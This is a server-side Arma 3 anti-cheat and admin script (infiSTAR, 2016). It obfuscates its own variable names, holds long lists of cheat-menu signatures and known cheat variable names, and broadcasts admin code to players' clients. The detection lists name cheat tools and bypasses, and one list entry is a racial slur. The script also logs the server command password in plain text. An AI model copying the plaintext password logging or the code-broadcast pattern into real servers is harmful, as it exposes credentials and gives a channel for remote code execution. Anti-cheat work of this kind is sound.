/*
	File: A3AH.sqf
	Author: Chris(tian) "infiSTAR" Lorenzen
	Contact: infiSTAR23@gmail.com
	
	Description:
	Arma AntiHack & AdminTools - infiSTAR.de
*/
/* *******************Developer : infiSTAR (infiSTAR23@gmail.com)******************* */
/* **************infiSTAR Copyright�� 2011 - 2016 All rights reserved.************** */
/* *********************************www.infiSTAR.de********************************* */
diag_log '<infiSTAR.de> VERSION: 02-Dec-2016 18-49-36 infiSTAR.de AHAT (v0245)';
comment 'Antihack & AdminTools - Christian Lorenzen - www.infiSTAR.de - License: (CC)';
UPDATEEMAIL='leopinheirohn@gmail.com';
INFISTARVERSION='02-Dec-2016 18-49-36 - v0245';
if((toLower UPDATEEMAIL) in ['','infiSTAR@ok.de','admin@infistar.de'])exitWith{
	diag_log '<infiSTAR.de> Please go to update.infistar.de and download the latest version of infiSTAR!';
	diag_log format['<infiSTAR.de> The current version is licensed to %1 and not your email address.',UPDATEEMAIL];
	diag_log '<infiSTAR.de> infiSTAR will NOT START if it is licensed to that email address!';
};
diag_log format['<infiSTAR.de> %1 - STARTING',time];
_t = time;
diag_log format['<infiSTAR.de> %1 - TESTING IF serverCommandPassword IS SET PROPERLY',_t];
_return = _serverCommandPassword serverCommand format ['#kick %1',0];
if(!_return)exitWith
{
	diag_log format['<infiSTAR.de> %1 - serverCommandPassword NOT SET!    leopinheirohn@gmail.com - 02-Dec-2016 18-49-36 - v0245 - %2 - %3',_t,serverName,productVersion];
	diag_log format['<infiSTAR.de> %1 - serverCommandPassword   in infiSTAR_config.sqf is %2',_t,_serverCommandPassword];
	diag_log format['<infiSTAR.de> %1 - serverCommandPassword   is defined in your servers config.cfg',_t];
	diag_log format['<infiSTAR.de> %1 - serverCommandPassword   if your config.cfg does not have serverCommandPassword yet, simply add it in a new line: serverCommandPassword = "changeme";',_t];
	diag_log format['<infiSTAR.de> %1 - serverCommandPassword   has to be set it in infiSTAR_config.sqf where it says _serverCommandPassword = "changeme";',_t];
	diag_log format['<infiSTAR.de> %1 - infiSTAR will not START if passwords are not set properly!',_t];
};
FN_GET_SERVERPW = compileFinal (str _serverCommandPassword);
diag_log format['<infiSTAR.de> %1 - serverCommandPassword IS FINE',_t];
if!(isClass (missionconfigfile >> 'infiSTAR_AdminMenu'))exitWith
{
	diag_log format['<infiSTAR.de> %1 - infiSTAR_AdminMenu.hpp is not in your MPMission or you forgot to #include it within your description.ext   [leopinheirohn@gmail.com - 02-Dec-2016 18-49-36 - v0245 - %2 - %3]',_t,serverName,productVersion];
};
_test = [0,{}] execFSM 'call.fsm';
_test = [0,{}] execFSM 'call.fsm';
if(_test isEqualTo 0)exitWith
{
	_log = format['<infiSTAR.de> %1 - call.fsm missing in your MPmission!    leopinheirohn@gmail.com - 02-Dec-2016 18-49-36 - v0245 - %2 - %3',_t,serverName,productVersion];
	for '_i' from 0 to 30 do
	{
		diag_log _log;
		diag_log format['<infiSTAR.de> %1 - infiSTAR will not START if files are not in place!',_t];
	};
};
infiSTAR_MOD = compileFinal str _MOD;
_respawn_west = getMarkerPos 'respawn_west';
_respawn_east = getMarkerPos 'respawn_east';
_respawn_guerrila = getMarkerPos 'respawn_guerrila';
_respawn_civilian = getMarkerPos 'respawn_civilian';
FN_CALL_LOAD_DLL = compileFinal "'ARMA_LOAD' callExtension _this";
FNC_A3_LOG_RAND_VAR = compileFinal "
	'ARMA_LOG' callExtension format['A3_RANDOMVAR_LOG:%1 (v0245)',_this];
	diag_log ('<infiSTAR.de>RandomVarLog| '+_this+' (v0245)');
";
fn_clean_bad = compileFinal "
	private '_clean';
	_clean = _this;
	_clean = toArray _clean;
	_clean = _clean - [35];
	_clean = toString _clean;
	_clean
";
_allRandomGenVars = [];
_counts = [];
{
	_counts pushBack (count _x);
} forEach (allVariables missionnamespace);
_num = 0;
{
	_num = _num + _x;
} forEach _counts;
_count = count _counts;
_average = round(_num / _count);
_randminval = (_average/3);
_randmaxval = (_average/1.5);
_fnc_RandomGen =
{
	_fnc_actualGen = {
		_abc = ['z','y','x','w','v','u','t','s','r','q','p','o','n','m','l','k','j','i','h','g','f','e','d','c','b','a'];
		_gen = _abc select (random ((count _abc)-1));
		_arr = ['z','F','3','m','A','e','a','M','6','b','k','t','r','4','T','A','a','d','L','B','Q','X','e','3','k','E','Y','g','i','P'];
		_randmax = {((round(random _randminval)) + (round(random _randmaxval))) max _randminval};
		for '_i' from 0 to (call _randmax)do
		{
			_gen = _gen + str(round(random 9)) + (_arr select (random ((count _arr)-1)));
		};
	};
	_gen = '';
	while{_gen=='' || _gen in _allRandomGenVars}do{
		call _fnc_actualGen;
	};
	_allRandomGenVars pushBack _gen;
	_gen
};diag_log format['<infiSTAR.de> _fnc_RandomGen: %1',_fnc_RandomGen];
format['----START-LINE----   (%1)',INFISTARVERSION] call FNC_A3_LOG_RAND_VAR;
_adminbox = call _fnc_RandomGen;format['_adminbox: %1',_adminbox] call FNC_A3_LOG_RAND_VAR;
_fnc_mpPackets = call _fnc_RandomGen;format['_fnc_mpPackets: %1',_fnc_mpPackets] call FNC_A3_LOG_RAND_VAR;
_FNC_AH1311_KICKLOG = call _fnc_RandomGen;format['_FNC_AH1311_KICKLOG: %1',_FNC_AH1311_KICKLOG] call FNC_A3_LOG_RAND_VAR;
_FNC_AH1311_KICKLOGSPAWN = call _fnc_RandomGen;format['_FNC_AH1311_KICKLOGSPAWN: %1',_FNC_AH1311_KICKLOGSPAWN] call FNC_A3_LOG_RAND_VAR;
_FNC_PVAH_AdminReq = call _fnc_RandomGen;format['_FNC_PVAH_AdminReq: %1',_FNC_PVAH_AdminReq] call FNC_A3_LOG_RAND_VAR;
_BigTokenArray = call _fnc_RandomGen;format['_BigTokenArray: %1',_BigTokenArray] call FNC_A3_LOG_RAND_VAR;
_connectedArray = call _fnc_RandomGen;format['_connectedArray: %1',_connectedArray] call FNC_A3_LOG_RAND_VAR;
_tokenSentArray = call _fnc_RandomGen;format['_tokenSentArray: %1',_tokenSentArray] call FNC_A3_LOG_RAND_VAR;
_server_setTokenR = call _fnc_RandomGen;format['_server_setTokenR: %1',_server_setTokenR] call FNC_A3_LOG_RAND_VAR;
_fnc_pvc_token = call _fnc_RandomGen;format['_fnc_pvc_token: %1',_fnc_pvc_token] call FNC_A3_LOG_RAND_VAR;
_server_checkTokenR = call _fnc_RandomGen;format['_server_checkTokenR: %1',_server_checkTokenR] call FNC_A3_LOG_RAND_VAR;
_YourPlayerToken = call _fnc_RandomGen;format['_YourPlayerToken: %1',_YourPlayerToken] call FNC_A3_LOG_RAND_VAR;
_TokenCT = call _fnc_RandomGen;format['_TokenCT: %1',_TokenCT] call FNC_A3_LOG_RAND_VAR;
_AH_MAIN_BLOCK = call _fnc_RandomGen;format['_AH_MAIN_BLOCK: %1',_AH_MAIN_BLOCK] call FNC_A3_LOG_RAND_VAR;
_AHKickOFF = call _fnc_RandomGen;format['_AHKickOFF: %1',_AHKickOFF] call FNC_A3_LOG_RAND_VAR;
_AH1311KICKLOG = call _fnc_RandomGen;format['_AH1311KICKLOG: %1',_AH1311KICKLOG] call FNC_A3_LOG_RAND_VAR;
_FiredCheck = call _fnc_RandomGen;format['_FiredCheck: %1',_FiredCheck] call FNC_A3_LOG_RAND_VAR;
_clientdo = call _fnc_RandomGen;format['_clientdo: %1',_clientdo] call FNC_A3_LOG_RAND_VAR;
_AH_RunCheckENDVAR = call _fnc_RandomGen;format['_AH_RunCheckENDVAR: %1',_AH_RunCheckENDVAR] call FNC_A3_LOG_RAND_VAR;
_AH_HackLogArrayRND = call _fnc_RandomGen;format['_AH_HackLogArrayRND: %1',_AH_HackLogArrayRND] call FNC_A3_LOG_RAND_VAR;
_AH_SurvLogArrayRND = call _fnc_RandomGen;format['_AH_SurvLogArrayRND: %1',_AH_SurvLogArrayRND] call FNC_A3_LOG_RAND_VAR;
_AH_AdmiLogArrayRND = call _fnc_RandomGen;format['_AH_AdmiLogArrayRND: %1',_AH_AdmiLogArrayRND] call FNC_A3_LOG_RAND_VAR;
_TMPBAN = call _fnc_RandomGen;format['_TMPBAN: %1',_TMPBAN] call FNC_A3_LOG_RAND_VAR;
_massMessage = call _fnc_RandomGen;format['_massMessage: %1',_massMessage] call FNC_A3_LOG_RAND_VAR;
_massSysMessage = call _fnc_RandomGen;format['_massSysMessage: %1',_massSysMessage] call FNC_A3_LOG_RAND_VAR;
_AHpos = call _fnc_RandomGen;format['_AHpos: %1',_AHpos] call FNC_A3_LOG_RAND_VAR;
_ninetwo = call _fnc_RandomGen;format['_ninetwo: %1',_ninetwo] call FNC_A3_LOG_RAND_VAR;
_ninetwothread = call _fnc_RandomGen;format['_ninetwothread: %1',_ninetwothread] call FNC_A3_LOG_RAND_VAR;
_adminsA = call _fnc_RandomGen;format['_adminsA: %1',_adminsA] call FNC_A3_LOG_RAND_VAR;
_MC = call _fnc_RandomGen;format['_MC: %1',_MC] call FNC_A3_LOG_RAND_VAR;
_MCS = call _fnc_RandomGen;format['_MCS: %1',_MCS] call FNC_A3_LOG_RAND_VAR;
_oneachframe = call _fnc_RandomGen;format['_oneachframe: %1',_oneachframe] call FNC_A3_LOG_RAND_VAR;
_checkidicheckcheck = call _fnc_RandomGen;format['_checkidicheckcheck: %1',_checkidicheckcheck] call FNC_A3_LOG_RAND_VAR;
_lastshotmade = call _fnc_RandomGen;format['_lastshotmade: %1',_lastshotmade] call FNC_A3_LOG_RAND_VAR;
_dellocveh = call _fnc_RandomGen;format['_dellocveh: %1',_dellocveh] call FNC_A3_LOG_RAND_VAR;
_inCombatTime = call _fnc_RandomGen;format['_inCombatTime: %1',_inCombatTime] call FNC_A3_LOG_RAND_VAR;
_inCombatArray = call _fnc_RandomGen;format['_inCombatArray: %1',_inCombatArray] call FNC_A3_LOG_RAND_VAR;
_fnc_infiKeyHandler = call _fnc_RandomGen;format['_fnc_infiKeyHandler: %1',_fnc_infiKeyHandler] call FNC_A3_LOG_RAND_VAR;
_ButtonDownCnt = call _fnc_RandomGen;format['_ButtonDownCnt: %1',_ButtonDownCnt] call FNC_A3_LOG_RAND_VAR;
_ButtonDownTime = call _fnc_RandomGen;format['_ButtonDownTime: %1',_ButtonDownTime] call FNC_A3_LOG_RAND_VAR;
_clickOnMapTimer = call _fnc_RandomGen;format['_clickOnMapTimer: %1',_clickOnMapTimer] call FNC_A3_LOG_RAND_VAR;
_clickOnMapCaught = call _fnc_RandomGen;format['_clickOnMapCaught: %1',_clickOnMapCaught] call FNC_A3_LOG_RAND_VAR;
_MAKE_VAR_DUMP_RANDOM = call _fnc_RandomGen;format['_MAKE_VAR_DUMP_RANDOM: %1',_MAKE_VAR_DUMP_RANDOM] call FNC_A3_LOG_RAND_VAR;
_MAKE_VAR_DUMP_CLIENT = call _fnc_RandomGen;format['_MAKE_VAR_DUMP_CLIENT: %1',_MAKE_VAR_DUMP_CLIENT] call FNC_A3_LOG_RAND_VAR;
_DUMPINGPLAYERUIDARRAY = call _fnc_RandomGen;format['_DUMPINGPLAYERUIDARRAY: %1',_DUMPINGPLAYERUIDARRAY] call FNC_A3_LOG_RAND_VAR;
_CURRENTLYDUMPING = call _fnc_RandomGen;format['_CURRENTLYDUMPING: %1',_CURRENTLYDUMPING] call FNC_A3_LOG_RAND_VAR;
_LogicVariable = call _fnc_RandomGen;format['_LogicVariable: %1',_LogicVariable] call FNC_A3_LOG_RAND_VAR;
_antiantihack_rndvar = call _fnc_RandomGen;format['_antiantihack_rndvar: %1',_antiantihack_rndvar] call FNC_A3_LOG_RAND_VAR;
_owner_by_uid = call _fnc_RandomGen;format['_owner_by_uid: %1',_owner_by_uid] call FNC_A3_LOG_RAND_VAR;
_uid_by_owner = call _fnc_RandomGen;format['_uid_by_owner: %1',_uid_by_owner] call FNC_A3_LOG_RAND_VAR;
_customcommandingMenu = call _fnc_RandomGen;format['_customcommandingMenu: %1',_customcommandingMenu] call FNC_A3_LOG_RAND_VAR;
_customcommandingMenuOpen = call _fnc_RandomGen;format['_customcommandingMenuOpen: %1',_customcommandingMenuOpen] call FNC_A3_LOG_RAND_VAR;
if(_useTildMenu)then{_cMenu pushBack ('#USER:'+_customcommandingMenu);};
_fnc_RandomGen =
{
	_arr = ['a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z'];
	_gen = 'PVAHR_';
	_max = 5+(round(random 3));
	for '_i' from 1 to _max do {_gen = _gen + str(round(random 9)) + (_arr select (random ((count _arr)-1)));};
	_allRandomGenVars pushBack _gen;
	_gen
};
_AH1311_KICKLOG = call _fnc_RandomGen;format['_AH1311_KICKLOG: %1',_AH1311_KICKLOG] call FNC_A3_LOG_RAND_VAR;
_RequestToken = call _fnc_RandomGen;format['_RequestToken: %1',_RequestToken] call FNC_A3_LOG_RAND_VAR;
format['----END-LINE----   (%1)',INFISTARVERSION] call FNC_A3_LOG_RAND_VAR;
_KK_fnc_arrayShuffle = {
	private '_cnt';
	_cnt = count _this;
	for '_i' from 1 to _cnt do {
		_this pushBack (_this deleteAt floor random _cnt);
	};
	_this
};
_allRandomGenVars call _KK_fnc_arrayShuffle;
diag_log format['<infiSTAR.de> %1 - loading AntiHack..',time];


/* OVERWRITING SOME SETTINGS */
if(_MOD == 'AltisLife')then
{
/*  Notification check   */ _UNC = false;	/* true or false */	/* _UNC = false; on AltisLife! - showNotification check */
/*  Check Attached Objs  */ _CAO = false;	/* true or false */	/* needs to be  false  when using e.g. IgiLoad */
/*  Check Actions Plr    */ _CAP = false;	/* true or false */	/* only logs to Surveillancelog so far */
/*  Remove Actions Plr   */ _OAP = false;	/* true or false */	/* Remove ALL Actions on Player Object: (mousewheel actions) needs to be  false  for AltisLife for e.g. gathering */
/*  Remove Actions Objs  */ _OAO = false;	/* true or false */	/* Remove ALL Actions on Objects near Player: (mousewheel actions) needs to be  false  when using e.g. IgiLoad */
};
/*  Use BadVar #1 */ _UBV = true;	/* true or false */	/* recommended to use */
/*  Use BadVar #2 */ _UBV2 = true;	/* true or false */	/* recommended to use */

_badVarWhitelistReal = [];if(!isNil'_badVarWhitelist')then{_badVarWhitelistReal = _badVarWhitelist;};
if(typeName _rOEF == 'STRING')then
{
	_rOEF = compileFinal _rOEF;
};
if(typeName _CHD == 'STRING')then
{
	_CHD = compileFinal _CHD;
};
if(typeName _customFiredEventhandler == 'STRING')then
{
	_customFiredEventhandler = compileFinal _customFiredEventhandler;
};
_verybadStrings =
[
	'menu loaded','rustler','hangender','hungender',
	'douggem','monstercheats','bigben','fireworks',' is god',
	'hydroxus','kill target','no recoil','rapid fire','explode all','teleportall',
	'destroyall','destroy all','code to execute','g-e-f','box-esp','god on','god mode','unlimited mags',
	'_execscript','_theban','rhynov1','b1g_b3n','infishit','_escorttt',
	'e_x_t_a_s_y','weppp3','att4chm3nt','f0od_dr1nk','m3d1c4l','t0ol_it3ms','b4ckp4cks',
	'it3m5','cl0th1ng','lystic','extasy','glasssimon_flo','remote_execution','gladtwoown','_pathtoscripts',
	'flo_simon','sonicccc_','fury_','phoenix_','_my_new_bullet_man','_jm3',
	'thirtysix','dmc_fnc_4danews','w_o_o_k_i_e_m_e_n_u','xbowbii_','jm3_','wuat','menutest_','listening to jack',
	'dmcheats.de','kichdm','_news_banner','fucked up','lystics menu','rsccombo_2100','\dll\datmalloc','rsclistbox_1501',
	'rsclistbox_1500','\dll\tcmalloc_bi','___newbpass','updated_playerlist','recking_ki','gg_ee_ff','ggggg_eeeee_fffff',
	'gggg_eeee_ffff','mord all','teleport all','__byass','_altislifeh4x','antifrezze','ownscripts','ownscripted','mesnu',
	'mystic_','init re','init life re','spoody','gef_','throx_','_adasaasasa','_dsfnsjf','cheatmenu','in54nity','markad','fuck_me_','_v4fin',
	'a3randvar','infinite ammo','player markers','+ _code +'
];
_BadVar3Array =
[
	'BIS_fnc_dbg_reminder_value','BIS_fnc_dbg_reminder','BIS_MENU_GroupCommunication','BIS_fnc_addCommMenuItem_menu',
	'rscspectator','rscspectator_hints','rscspectator_display','rscspectator_playericon',
	'rscspectator_view','rscspectator_map','rscspectator_vision','rscspectator_keys',
	'rscspectator_interface','whsh506_M41N','finiFeaturesFormatted','nigger_Init',
	'time','serverTime','myplayeruid','hhahaaaaar','CharlieSheenkeybinds','KickOFF','yolo','runonce','notakeybind','action1','Supa_Licenses','autokick','wallaisseikun','MainMenu','anArray',
	'GEFClose','GEFWhite','GEFRed','GEFGreen','GEFCyan','FirstHint','new_queued','fn_Exec','FND_fnc_select','fnx3','ANTIHACKKICK','tele','dmap','GOLDENS_GLOBAL_SHIT_YEAH','GLASS911_Run',
	'gearDialog_create','lystoKeypress','ThirtySix','LY_SwaggerLikeUs','Jkeyszz','n2','boxofmagic','MainScripts','DMC_fnc_4danews','INFISTARBYPASS','EXEC_TEXT','vehicle_dblclick','init_main',
	'ESP_Count','Nute_Dat_Bomber','s_cash100k','XposPlayer','ly_re_onetime','SKAR_checkA','MainScriptsV4','ViewDistance','check_load','already_load','meins','f1','Dummy','Plane_Jump',
	'c_player','MouseClickEH','distp','nec2','Menu_I_Run_Color_LP','GLASSv1nce_BindHandler','thecar','FastAnimes','GetinPassenger','iaimon','DMC_Re_onetime','func_execOnServer','fnc_serverKickNice',
	'Kick_Admins','DASMOKEON','hovering','r_kelly_be_flying','SLX_XEH_BWC_INIT_COMPILE','VinceLOL_ALTISLIFE','life_fnc_byassSkaroAH','AH_fnc_MP','jayRE','fn_newsbanner','Hack_News','TrollFuncs',
	'Fanatic_InfiPass','keybindings_xxx','AndysClosed','UserFuncs','AltisFuncs','RemExe','BB_nofatigue','bis_fnc_diagkey_var_code','First_PAGE','Get_in_D','i_t_s__m_e_o','smissles','Whippy_ESP',
	'TargetFuncs2','life_fnc_antiFreeeeze','LY_keyForward','TY_re_onetime','life_fnc_XaAxAA','mein1','GodDamnVehiclesXD','Mystic_FNC_ESP_distance','Esp_Id_setter','DummyMen','whipbut','UserFuncs',
	'KrohdoFreedom','selectedPlayer','Lmenu1','ggplayer','throx_menu_item','lvl1','Init_Menu_Slew','D_B_R_T_Y_Slew','V6_GEF','xasfjisisafudmmyx','kekse','UPDATED_RE_36','first','second','Paradox_s3tc4sh',
	'checkChatLoop','bringmeup','finiE_S_P','BMCloos'
];
_blacklistedVariables append ['fnc_infiAdminKeyDown'];


_UMH_ARRAY = [
	["getText(configfile >> 'RscDisplayInventory' >> 'controls' >> 'EpochBTN1' >> 'onMouseButtonDown')",'RscDisplayInventory >> EpochBTN1','onMouseButtonDown'],
	["getText(configfile >> 'RscDisplayInventory' >> 'controls' >> 'EpochBTN2' >> 'onMouseButtonDown')",'RscDisplayInventory >> EpochBTN2','onMouseButtonDown'],
	["getText(configfile >> 'TapOut' >> 'controls' >> 'tapout' >> 'action')",'TapOut','action'],
	["getText(configfile >> 'TapOut' >> 'controls' >> 'tapout' >> 'onKeyDown')",'TapOut','onKeyDown'],
	["getText(configFile >> 'RscDisplayOptionsVideo' >> 'controls' >> 'G_VideoOptionsControls' >> 'controls' >> 'HideAdvanced' >> 'OnButtonClick')",'RscDisplayOptionsVideo >> HideAdvanced','OnButtonClick'],
	["getText(configFile >> 'RscDisplayOptions' >> 'controls' >> 'BCredits' >> 'OnButtonClick')",'RscDisplayOptions >> BCredits','OnButtonClick'],
	["getText(configFile >> 'RscDisplayOptions' >> 'controls' >> 'ButtonCancel' >> 'OnButtonClick')",'RscDisplayOptions >> ButtonCancel','OnButtonClick'],
	["getText(configFile >> 'RscDisplayOptions' >> 'controls' >> 'ButtonCancel' >> 'action')",'RscDisplayOptions >> ButtonCancel','action'],
	["getText(configFile >> 'RscDisplayOptions' >> 'controls' >> 'BGameOptions' >> 'action')",'RscDisplayOptions >> BGameOptions','action'],
	["getText(configFile >> 'RscDisplayOptions' >> 'controls' >> 'BConfigure' >> 'action')",'RscDisplayOptions >> BConfigure','action'],
	["getText(configFile >> 'RscDisplayMPInterrupt' >> 'controls' >>'ButtonAbort' >> 'action')",'RscDisplayMPInterrupt >> ButtonAbort','action'],
	["getText(configFile >> 'RscDisplayMPInterrupt' >> 'controls' >>'ButtonAbort' >> 'OnButtonClick')",'RscDisplayMPInterrupt >> ButtonAbort','OnButtonClick']
];
_UMH_ARRAYSERVER = [];
{
	_string = call compile (_x select 0);
	_sarray = toArray _string;
	_UMH_ARRAYSERVER pushBack _sarray;
} forEach _UMH_ARRAY;


if(_MOD == 'Epoch')then
{
	_onLoadUnload1Epochonly = [
		'RscWelcomeEpoch','RscDisplayInfo','RscVersionUpdateEpoch','RscInGameUI','RscUnitInfo','RscStanceInfo','RscUnitInfoAirRTDBasic','RscUnitInfoAirRTDFull','EpochLoadingScreen',
		'EpochGameUI','EpochGameUI2','EpochGameUI3','Interact','GroupRequests','CraftItem','InteractVehicle','InteractNPC','InteractBank','Epoch_myGroup','EPOCH_createGrp',
		'Epoch_GroupInvite'
	];
	_onLoadUnload1 = _onLoadUnload1 + _onLoadUnload1Epochonly;
};
_onLoadUnload2 = [];
_onLoadUnload3 = [];
{
	_onLoadUnload2 pushBack (toArray(getText(configFile >> _x >> 'onLoad')));
	_onLoadUnload3 pushBack (toArray(getText(configFile >> _x >> 'onUnload')));
} forEach _onLoadUnload1;
fnc_CompilableString = {
	_input = _this select 0;
	_output = call {
		if(_input isEqualType {})exitWith{(str(_input)) select [1,((count(str(_input)))-2)]};
		if(_input isEqualType '')exitWith{_input};
		''
	};
	_output
};
fnc_CompilableString = compileFinal ([fnc_CompilableString] call fnc_CompilableString);
publicVariable "fnc_CompilableString";
fnc_getserverTime = compileFinal "
	_hours = floor(serverTime / 60 / 60);
	_value = ((serverTime / 60 / 60) - _hours);
	if(_value == 0)then{_value = 0.0001;};
	_minutes = round(_value * 60);
	_mytime = format['%1h %2min | ',_hours,_minutes];
	_mytime
";
FNC_A3_HACKLOG = compileFinal "
	'ARMA_LOG' callExtension format['A3_HACKLOG:%1 [FPS: %2|THREADS: %3] (v0245)',_this,diag_fps,count diag_activeSQFScripts];
	diag_log ('<infiSTAR.de>HL| '+_this+' (v0245)');
";
FNC_A3_SURVEILLANCELOG = compileFinal "
	'ARMA_LOG' callExtension format['A3_SURVEILLANCELOG:%1 [FPS: %2|THREADS: %3] (v0245)',_this,diag_fps,count diag_activeSQFScripts];
	diag_log ('<infiSTAR.de>SL| '+_this+' (v0245)');
";
FNC_A3_ADMINLOG = compileFinal "
	'ARMA_LOG' callExtension format['A3_ADMINLOG:%1 (v0245)',_this];
	diag_log ('<infiSTAR.de>AdminLog| '+_this+' (v0245)');
";
FNC_A3_CONNECTLOG = compileFinal "
	'ARMA_LOG' callExtension format['A3_CONNECTLOG:%1 (v0245)',_this];
	diag_log ('<infiSTAR.de>ConnectLog| '+_this+' (v0245)');
";
FNC_A3_TOKENLOG = compileFinal "
	'ARMA_LOG' callExtension format['A3_TOKENLOG:%1 (v0245)',_this];
	diag_log ('<infiSTAR.de>TokenLog| '+_this+' (v0245)');
";
FNC_A3_RESOLVESTEAMNAMELOG = compileFinal "
	'ARMA_LOG' callExtension format['A3_RESOLVESTEAMNAMELOG:%1 (v0245)',_this];
	diag_log ('<infiSTAR.de>ResolveSteamName| '+_this+' (v0245)');
	if(!isNil'MAR_fnc_log')then{[_this,'infiSTAR.de_RESOLVESTEAMNAMELOG'] call MAR_fnc_log;};
";
FNC_A3_GLOBAL_SAFE = compileFinal "
	private['_reobj','_do'];
	_do = _this;
	if(isNil'_do')exitWith{
		_log = '_do is Nil';
		_log call FNC_A3_ADMINLOG;
	};
	if(typeName _do == 'CODE')then{_do = (str(_do)) select [1,((count(str(_do)))-2)];};
	if(typeName _do != 'STRING')then{_do = str _do;};
	_reobj = 'Supply0' createVehicle [0,0,0];
	if(isNil'_reobj')exitWith{
		_log = '_reobj is Nil';
		_log call FNC_A3_ADMINLOG;
	};
	if(isNull _reobj)exitWith{
		_log = '_reobj is Null';
		_log call FNC_A3_ADMINLOG;
	};
	_reobj setVariable['BIS_enableRandomization',false];
	_reobj addMPEventHandler ['MPKilled',('if(isServer)exitWith{};'+_do)];
	_reobj setDamage 5;
	_reobj spawn {waitUntil{_this setVariable['BIS_enableRandomization',false];!isNull _this};_this setVariable['BIS_enableRandomization',false];uiSleep 1;deleteVehicle _this;};
";
FNC_A3_GLOBAL = compileFinal "
	private['_reobj'];
	_reobj = 'Supply0' createVehicle [0,0,0];
	if(isNil'_reobj')exitWith{
		_log = '_reobj is Nil';
		_log call FNC_A3_ADMINLOG;
	};
	if(isNull _reobj)exitWith{
		_log = '_reobj is Null';
		_log call FNC_A3_ADMINLOG;
	};
	_reobj setVariable['BIS_enableRandomization',false];
	_reobj addMPEventHandler ['MPKilled',_this];
	_reobj setDamage 5;
	_reobj spawn {waitUntil{_this setVariable['BIS_enableRandomization',false];!isNull _this};_this setVariable['BIS_enableRandomization',false];uiSleep 1;deleteVehicle _this;};
";
fnc_stop_safe_glitch = compileFinal "
if(!isNil'EPOCH_initUI_THREAD')then{terminate EPOCH_initUI_THREAD;EPOCH_initUI_THREAD=nil;};
EPOCH_initUI_THREAD = _this spawn EPOCH_initUI;
_container = _this select 1;

_locked = locked _container in [2, 3];
_EPOCH_Locked = _container getVariable['EPOCH_Locked', false];
_lockedNear = false;

if(_container isKindOf 'GroundWeaponHolder' || _container isKindOf 'WeaponHolderSimulated')then
{
	{if (locked _x in [2, 3] ||_x getVariable['EPOCH_Locked', false]) exitWith {_lockedNear = true}} forEach (player nearSupplies 10);
	if(!_lockedNear)then
	{
		_vehicles = player nearObjects ['AllVehicles', 5];
		{
			_lockedx = locked _x in [2, 3];
			_EPOCH_Lockedx = _x getVariable['EPOCH_Locked', false];
			if((((_lockedx || _EPOCH_Lockedx) && !(local _x))||(!alive _x)) && !(_x in [_container,vehicle _container]))exitWith{_lockedNear = true;};
		} forEach _vehicles;
	};
};
if(_locked || _EPOCH_Locked || _lockedNear)then
{
	if(!isNil'checkGearDisplayThread')then{terminate checkGearDisplayThread;checkGearDisplayThread=nil;};
	checkGearDisplayThread = [] spawn {
		disableSerialization;
		waitUntil {!isNull findDisplay 602};
		waitUntil {
			_display = findDisplay 602;
			_ctrl_cargo = _display displayCtrl 6401;
			_ctrl_ground = _display displayCtrl 6321;
			_ctrl_cargo ctrlEnable  false;
			ctrlSetFocus _ctrl_ground;
			ctrlActivate _ctrl_ground;
			isNull findDisplay 602
		};
	};
};
";
FN_infiSTAR_C = compileFinal "(_this select 0) call (_this select 1)";publicVariable"FN_infiSTAR_C";
FN_infiSTAR_S = compileFinal "
params [['_input',''],['_code',{}],['_target',-10],['_jip',false]];
if(_target isEqualTo -10)exitWith{};
if(typename _code isEqualTo 'STRING')then{_code=compile _code;};
if(_target isEqualTo 2)exitWith{_input call _code};
[_input,_code] remoteExecCall ['FN_infiSTAR_C',_target,_jip]
";
fnc_call_ARMALOAD = compileFinal "
	private['_option','_input','_url','_packet1','_jobid','_packet2','_res','_timeout'];
	_option = _this select 0;
	_input = _this select 1;
	_url = _this select 2;
	
	_packet1 = format['getasync%1%2%1',toString [10],_url];
	_jobid = 'ARMA_LOAD' callExtension _packet1;
	_packet2 = format['response%1%2%1',toString [10],_jobid];
	_timeout = diag_tickTime + 10;
	_res = 'WAIT';
	waitUntil{
		_res = 'ARMA_LOAD' callExtension _packet2;
		_res != 'WAIT' || diag_tickTime > _timeout
	};
	if(_res=='WAIT'||_res==''||_res=='URLERROR')exitWith{};
	if((toLower _res) find 'wrapper is disabled' != -1)exitWith{};
	if(_option == 0)exitWith
	{
		if(isNil'ARMALOAD_urlARRAY')then{ARMALOAD_urlARRAY=[];};
		if(_url in ARMALOAD_urlARRAY)exitWith{diag_log '<infiSTAR.de> terminated double ARMA_LOAD call';};
		ARMALOAD_urlARRAY pushBack _url;
		
		private['_name','_puid','_clientID'];
		_name = _input select 0;
		_puid = _input select 1;
		
		STEAM_NAME_ARRAY pushBack _puid;
		STEAM_NAME_ARRAY pushBack _res;
		missionNameSpace setVariable['STEAM_NAME_ARRAY',STEAM_NAME_ARRAY];
		
		if(count _input == 3)then
		{
			_clientID = _input select 2;
			_code = {
				params['_name','_uid',['_steamname','']];
				_log = format['<infiSTAR.de> %1(%2) SteamName is: %3',_name,_uid,_steamname];
				cutText [_log, 'PLAIN DOWN'];
				hint _log;
				systemchat _log;
				diag_log _log;
			};
			[[_name,_puid,_res],_code,_clientID,false] call FN_infiSTAR_S;
			format['%1(%2) is %3',_name,_puid,_res] call FNC_A3_RESOLVESTEAMNAMELOG;
		};
	};
";
fnc_resolveSteamName = compileFinal "
	private['_name','_puid','_clientID','_inputToForward','_steamName','_res'];
	_name = _this select 0;
	_puid = _this select 1;
	_inputToForward = [_name,_puid];
	if(count _this == 3)then
	{
		_clientID = _this select 2;
		_inputToForward = [_name,_puid,_clientID];
	};
	_steamName = '';
	if(isNil 'STEAM_NAME_ARRAY')then{STEAM_NAME_ARRAY = missionNameSpace getVariable['STEAM_NAME_ARRAY',[]];};
	if(_puid in STEAM_NAME_ARRAY)then
	{
		_fid = STEAM_NAME_ARRAY find _puid;
		if(_fid != -1)exitWith
		{
			_steamName = (STEAM_NAME_ARRAY select (_fid+1));
		};
	}
	else
	{
		if(isNil 'STEAM_NAME_ARRAY_Q')then{STEAM_NAME_ARRAY_Q = [];};
		if!(_puid in STEAM_NAME_ARRAY_Q)then
		{
			STEAM_NAME_ARRAY_Q pushBack _puid;
			if(isNil'STEAM_NAME_URL')then{STEAM_NAME_URL = 'http://htmlload.infistar.de/steamname.php?steamuid=';};
			[0,_inputToForward,format['%1%2',STEAM_NAME_URL,_puid]] spawn fnc_call_ARMALOAD;
		};
	};
	_steamName
";
fnc_getSteamNameIfSaved = compileFinal "
	_steamName = _name;
